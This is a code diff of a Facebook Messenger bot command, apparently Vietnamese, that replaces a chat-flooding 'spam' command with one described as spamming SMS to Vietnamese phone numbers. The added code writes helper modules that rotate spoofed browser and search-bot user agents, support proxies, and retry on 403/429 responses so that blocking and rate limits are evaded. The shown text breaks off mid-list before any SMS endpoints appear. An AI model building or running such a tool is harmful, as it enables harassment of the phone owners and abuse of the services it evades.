@@ -1,42 +1,1176 @@
 module.exports.config = {
-  name: "spam",
-  version: "1.0.0",
-  hasPermssion: 3,
-  Rent: 2,
-  credits: "Vtuan",
-  description: "spam đến chết một nội dung",
-  commandCategory: "War/tag",
-  usages: "",
-  cooldowns: 1,
-  envConfig: {
-    spamDelay: 2// Thay đổi thời gian spam thành 30 giây
-  }
+    name: "spam",
+    version: "2.0.0",
+    hasPermssion: 2,
+    credits: "Nguyễn Trương Thiện Phát (pcoder)",
+    description: "Spam SMS to phone numbers (Vietnam only)",
+    commandCategory: "system",
+    usages: "spam [phone] [seconds] | spam apis",
+    cooldowns: 5,
+    dependencies: {
+        "axios": "",
+        "request": "",
+        "request-promise": ""
+    },
+    info: [
+        {
+            key: 'spam [phone]',
+            prompt: 'Spam SMS to the provided phone number (Vietnam only)',
+            type: 'SMS spam',
+            example: 'spam 0987654321 60'
+        },
+        {
+            key: 'spam apis',
+            prompt: 'Show list of available SMS APIs',
+            type: 'List APIs',
+            example: 'spam apis'
+        }
+    ]
 };
 
-const spamThreads = new Set();
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
+// Import required modules
+const axios = require('axios');
+const request = require('request-promise');
+const fs = require('fs');
+const path = require('path');
+
+// Path constants
+const userAgentDirPath = path.join(__dirname, '../utils');
+const userAgentsPath = path.join(userAgentDirPath, 'userAgents.js');
+const apiProxyPath = path.join(userAgentDirPath, 'apiProxy.js');
+const userAgentManagerPath = path.join(userAgentDirPath, 'userAgentManager.js');
+
+// Ensure utils directory exists
+if (!fs.existsSync(userAgentDirPath)) {
+    fs.mkdirSync(userAgentDirPath, { recursive: true });
+    console.log('[SPAM] Created utils directory automatically');
 }
-module.exports.run = async function ({ api, event, args }) {
-  const { threadID, messageID, senderID } = event;
-  const content = (args.length != 0) ? args.join(" ") : "🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n🔵🟣🟢🔴𝑯𝒐𝒂 𝑹𝒐̛𝒊 𝑪𝒖̛̉𝒂 𝑷𝒉𝒂̣̂𝒕 , 𝑽𝒂̣𝒏 𝑽𝒂̣̂𝒕 𝑪𝒖́𝒊 𝑫𝒂̂̀𝒖……❄️[𝑵𝑪𝑻] 𝒙 [𝑵𝑻𝒀𝑵]🏙🌃🌇🌆\n";
-  if (args[0] === "stop") {
-    if (spamThreads.has(threadID)) {
-      spamThreads.delete(threadID);
-      return api.sendMessage('Đã dừng spam!', threadID, messageID);
+
+// Function to check for and create missing modules
+function ensureModuleExists() {
+    // Check and create userAgents.js if needed
+    if (!fs.existsSync(userAgentsPath)) {
+        const userAgentsCode = `/**
+ * User Agents Generator Module
+ * Auto-generated by spam.js to prevent errors
+ * 
+ * This module provides a list of user agents to avoid API blocking
+ * Created by: Nguyễn Trương Thiện Phát (pcoder)
+ */
+
+// List of user agents (full version)
+const userAgents = [
+    // Windows browsers
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+    
+    // macOS browsers
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+    
+    // Linux browsers
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
+    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0',
+    
+    // iOS browsers
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/108.0.5359.52 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPad; CPU OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/114.0.5735.99 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/113.0.1774.50 Version/13.0 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.0 Mobile/15E148 Safari/605.1.15',
+    
+    // Android browsers
+    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Android 13; Mobile; rv:107.0) Gecko/107.0 Firefox/107.0',
+    'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 12; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
+    
+    // Bots and others
+    'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/108.0.5359.71 Safari/537.36',
+    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+    'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)'
+];
+
+// Function to get a random user agent from the list
+function getRandomUserAgent() {
+    const randomIndex = Math.floor(Math.random() * userAgents.length);
+    return userAgents[randomIndex];
+}
+
+// Function to get all user agents (for statistics)
+function getAllUserAgents() {
+    return [...userAgents];
+}
+
+// Function to refresh the user agent pool if needed
+function refreshUserAgentPool() {
+    // Implementation for refreshing could be added later
+    return getAllUserAgents().length;
+}
+
+// Export the functions
+module.exports = {
+    getRandomUserAgent,
+    getAllUserAgents,
+    refreshUserAgentPool
+};`;
+        
+        fs.writeFileSync(userAgentsPath, userAgentsCode);
+        console.log('[SPAM] Created userAgents.js module automatically');
     }
-    return api.sendMessage('Không có quá trình spam nào đang diễn ra!', threadID, messageID);
-  }
-  if (!spamThreads.has(threadID)) {
-    spamThreads.add(threadID);
-    api.sendMessage(`Bắt đầu spam!`, threadID, messageID);
-    while (spamThreads.has(threadID)) {
-      await delay(this.config.envConfig.spamDelay * 1000);
-      if (spamThreads.has(threadID)) {
-        api.sendMessage(content, threadID);
-      }
+    
+    // Check and create apiProxy.js if needed
+    if (!fs.existsSync(apiProxyPath)) {
+        const apiProxyCode = `/**
+ * API Proxy và Anti-Block Module
+ * Module này giúp tránh bị block khi gọi API liên tục
+ * Created by: Nguyễn Trương Thiện Phát (pcoder)
+ * Auto-generated by spam.js
+ * 
+ * Cách sử dụng:
+ * const { sendRequest, setRequestOptions } = require('../utils/apiProxy');
+ * 
+ * // Gửi request với user agent ngẫu nhiên
+ * const response = await sendRequest('https://api.example.com/data');
+ * 
+ * // Hoặc tùy chỉnh options
+ * const options = {
+ *    headers: { 'Custom-Header': 'value' },
+ *    timeout: 10000,
+ *    retries: 3
+ * };
+ * const response = await sendRequest('https://api.example.com/data', options);
+ */
+
+const https = require('https');
+const http = require('http');
+const url = require('url');
+const { getRandomUserAgent, refreshUserAgentPool } = require('./userAgents');
+
+// Danh sách proxy nếu cần (có thể để trống nếu không dùng proxy)
+const proxies = [
+    // Format: { host: 'proxy.example.com', port: 8080, auth: 'username:password' }
+    // Nếu có proxy, hãy thêm vào đây
+];
+
+// Cấu hình mặc định
+const defaultOptions = {
+    timeout: 30000, // 30 giây
+    retries: 3,     // Số lần thử lại khi request thất bại
+    retryDelay: 1000, // Độ trễ giữa các lần thử lại (ms)
+    useProxy: false,  // Mặc định không dùng proxy
+    rotateUserAgent: true, // Luôn thay đổi user agent
+    headers: {
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'keep-alive',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-User': '?1',
+        'Upgrade-Insecure-Requests': '1',
+        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"'
     }
-  } else {
-    api.sendMessage('Đang spam rồi cut!', threadID, messageID);
-  }
 };
+
+let currentOptions = { ...defaultOptions };
+
+/**
+ * Cài đặt tùy chọn mới cho API request
+ * @param {Object} options - Các tùy chọn mới
+ */
+function setRequestOptions(options) {
+    currentOptions = { ...defaultOptions, ...options };
+    return currentOptions;
+}
+
+/**
+ * Lấy một proxy ngẫu nhiên từ danh sách
+ * @returns {Object|null} - Thông tin proxy hoặc null nếu không có
+ */
+function getRandomProxy() {
+    if (!proxies.length) return null;
+    return proxies[Math.floor(Math.random() * proxies.length)];
+}
+
+/**
+ * Thực hiện HTTP request với các biện pháp tránh bị block
+ * @param {string} requestUrl - URL cần gọi
+ * @param {Object} options - Tùy chọn cho request
+ * @returns {Promise<Object>} - Promise chứa response
+ */
+async function sendRequest(requestUrl, options = {}) {
+    // Kết hợp tùy chọn mặc định và tùy chọn người dùng
+    const requestOptions = { ...currentOptions, ...options };
+    
+    // Thử lại nếu có lỗi
+    let lastError = null;
+    for (let attempt = 0; attempt < requestOptions.retries; attempt++) {
+        try {
+            // Nếu không phải lần thử đầu tiên, đợi một khoảng thời gian
+            if (attempt > 0) {
+                await new Promise(resolve => setTimeout(resolve, requestOptions.retryDelay));
+            }
+            
+            // Lấy user agent ngẫu nhiên nếu được yêu cầu
+            if (requestOptions.rotateUserAgent) {
+                requestOptions.headers = {
+                    ...requestOptions.headers,
+                    'User-Agent': getRandomUserAgent()
+                };
+            }
+            
+            // Lấy proxy nếu được yêu cầu
+            let proxyConfig = null;
+            if (requestOptions.useProxy && proxies.length > 0) {
+                proxyConfig = getRandomProxy();
+            }
+            
+            // Thực hiện request
+            const response = await makeRequest(requestUrl, requestOptions, proxyConfig);
+            return response;
+        } catch (error) {
+            lastError = error;
+            
+            // Nếu lỗi là do bị chặn (status 403, 429, v.v.), đổi user agent và proxy
+            if (error.statusCode === 403 || error.statusCode === 429) {
+                // Đổi user agent và thử lại
+                if (requestOptions.rotateUserAgent) {
+                    requestOptions.headers['User-Agent'] = getRandomUserAgent();
+                }
+                
+                // Tăng thời gian chờ giữa các request
+                await new Promise(resolve => setTimeout(resolve, requestOptions.retryDelay * 2));
+            }
+        }
+    }
+    
+    // Nếu tất cả các lần thử đều thất bại, ném lỗi cuối cùng
+    throw lastError || new Error('Request failed after multiple attempts');
+}
+
+/**
+ * Thực hiện HTTP request
+ * @param {string} requestUrl - URL cần gọi
+ * @param {Object} options - Tùy chọn cho request
+ * @param {Object|null} proxy - Thông tin proxy
+ * @returns {Promise<Object>} - Promise chứa response
+ */
+function makeRequest(requestUrl, options, proxy = null) {
+    return new Promise((resolve, reject) => {
+        // Parse URL để lấy thông tin protocol, hostname, path
+        const parsedUrl = url.parse(requestUrl);
+        
+        // Xác định module HTTP/HTTPS dựa vào protocol
+        const httpModule = parsedUrl.protocol === 'https:' ? https : http;
+        
+        // Chuẩn bị tùy chọn cho request
+        const requestOptions = {
+            method: options.method || 'GET',
+            headers: options.headers || {},
+            timeout: options.timeout || 30000
+        };
+        
+        // Thêm thông tin proxy nếu có
+        if (proxy) {
+            requestOptions.host = proxy.host;
+            requestOptions.port = proxy.port;
+            requestOptions.path = requestUrl; // Dùng URL đầy đủ khi dùng proxy
+            
+            // Thêm xác thực proxy nếu có
+            if (proxy.auth) {
+                requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxy.auth).toString('base64');
+            }
+        } else {
+            requestOptions.host = parsedUrl.hostname;
+            requestOptions.port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
+            requestOptions.path = parsedUrl.path;
+        }
+        
+        // Thực hiện request
+        const req = httpModule.request(requestOptions, (res) => {
+            let data = '';
+            
+            // Nhận dữ liệu
+            res.on('data', (chunk) => {
+                data += chunk;
+            });
+            
+            // Hoàn thành
+            res.on('end', () => {
+                // Xử lý các mã trạng thái khác nhau
+                if (res.statusCode >= 200 && res.statusCode < 300) {
+                    try {
+                        // Thử phân tích JSON
+                        const contentType = res.headers['content-type'] || '';
+                        if (contentType.includes('application/json')) {
+                            resolve({
+                                statusCode: res.statusCode,
+                                headers: res.headers,
+                                body: JSON.parse(data),
+                                rawBody: data
+                            });
+                        } else {
+                            // Không phải JSON, trả về dạng text
+                            resolve({
+                                statusCode: res.statusCode,
+                                headers: res.headers,
+                                body: data,
+                                rawBody: data
+                            });
+                        }
+                    } catch (error) {
+                        // Lỗi khi phân tích JSON
+                        resolve({
+                            statusCode: res.statusCode,
+                            headers: res.headers,
+                            body: data,
+                            rawBody: data,
+                            error: 'JSON parse error'
+                        });
+                    }
+                } else {
+                    // Lỗi HTTP
+                    const error = new Error(\`HTTP Error \${res.statusCode}: \${data}\`);
+                    error.statusCode = res.statusCode;
+                    error.headers = res.headers;
+                    error.body = data;
+                    reject(error);
+                }
+            });
+        });
+        
+        // Xử lý lỗi
+        req.on('error', (error) => {
+            reject(error);
+        });
+        
+        // Xử lý timeout
+        req.on('timeout', () => {
+            req.destroy();
+            reject(new Error('Request timed out'));
+        });
+        
+        // Thêm dữ liệu nếu là POST, PUT, PATCH
+        if (options.body && ['POST', 'PUT', 'PATCH'].includes(requestOptions.method)) {
+            const body = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
+            
+            // Tự động thêm content-type nếu không có
+            if (!requestOptions.headers['content-type']) {
+                requestOptions.headers['content-type'] = 'application/json';
+            }
+            
+            req.write(body);
+        }
+        
+        // Kết thúc request
+        req.end();
+    });
+}
+
+// Cập nhật user agent pool mỗi 6 giờ
+setInterval(() => {
+    refreshUserAgentPool();
+}, 6 * 60 * 60 * 1000);
+
+module.exports = {
+    sendRequest,
+    setRequestOptions
+};`;
+        
+        fs.writeFileSync(apiProxyPath, apiProxyCode);
+        console.log('[SPAM] Created apiProxy.js module automatically');
+    }
+    
+    // Check and create userAgentManager.js if needed
+    if (!fs.existsSync(userAgentManagerPath)) {
+        const userAgentManagerCode = `/**
+ * User Agent Manager - Quản lý tự động user agent
+ * Cung cấp các hàm để quản lý user agent tự động, lưu cache, và tránh bị block API
+ * Created by: Nguyễn Trương Thiện Phát (pcoder)
+ * Auto-generated by spam.js
+ * 
+ * Cách sử dụng:
+ * const { attachUserAgentToApi } = require('../utils/userAgentManager');
+ * 
+ * // Áp dụng user agent vào API
+ * attachUserAgentToApi(api);
+ * 
+ * // Sau khi áp dụng, mọi request qua api sẽ tự động được gắn user agent khác nhau
+ */
+
+const { getRandomUserAgent, refreshUserAgentPool } = require('./userAgents');
+
+// Lưu cache các API đã được áp dụng user agent
+const attachedApis = new WeakMap();
+
+// Tỷ lệ thay đổi user agent (0.0 - 1.0)
+// 1.0 = đổi user agent mỗi request
+// 0.5 = đổi user agent 50% số request
+const AGENT_CHANGE_RATIO = 1.0;
+
+/**
+ * Áp dụng user agent vào tất cả các phương thức API của Facebook
+ * @param {Object} api - API object từ Facebook-api
+ * @returns {Object} - API object đã được áp dụng user agent
+ */
+function attachUserAgentToApi(api) {
+    // Nếu đã áp dụng rồi thì bỏ qua
+    if (attachedApis.has(api)) {
+        return api;
+    }
+    
+    // Danh sách các phương thức cần áp dụng user agent
+    const methodsToAttach = [
+        'sendMessage',
+        'getUserInfo',
+        'getThreadInfo',
+        'getThreadList',
+        'searchThreads',
+        'getThreadHistory',
+        'markAsRead',
+        'markAsDelivered',
+        'setMessageReaction',
+        'addUserToGroup',
+        'removeUserFromGroup',
+        'changeThreadEmoji',
+        'changeThreadColor',
+        'changeNickname',
+        'handleMessageRequest',
+        'getThreadPictures',
+        'forwardAttachment',
+        'setPostReaction',
+        'createNewGroup',
+        'changeGroupImage',
+        'changeAdminStatus',
+        'changeApprovalMode',
+        'setTitle',
+        'muteThread',
+        'unmuteThread',
+        'deleteMessage',
